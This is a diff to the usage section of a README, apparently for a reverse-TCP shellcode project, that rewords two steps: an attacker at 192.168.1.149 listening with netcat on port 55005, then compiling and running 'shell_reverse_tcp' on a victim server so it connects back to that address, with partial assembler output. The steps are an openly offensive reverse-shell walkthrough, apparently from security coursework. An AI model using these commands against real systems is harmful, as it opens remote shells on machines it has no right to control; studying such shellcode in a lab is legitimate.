@@ -1,12 +1,12 @@
 USAGE
 
-1. attacker has 192.168.1.149 IP and runs nc to listen on 55005 port
+1. For example, you are an attacker with 192.168.1.149 IP. Run nc to listen on 55005 port
 
 attacker $ nc -vl 55005
 [do not close it]
 
 
-2. Running shellcode a victim server
+2. Running shellcode on a victim server
 exam2$ ./compile_all.sh shell_reverse_tcp 192.168.1.149 55005
  [I] Using custom port: 55005
  [+] Assembling shell_reverse_tcp.nasm with NASM ...
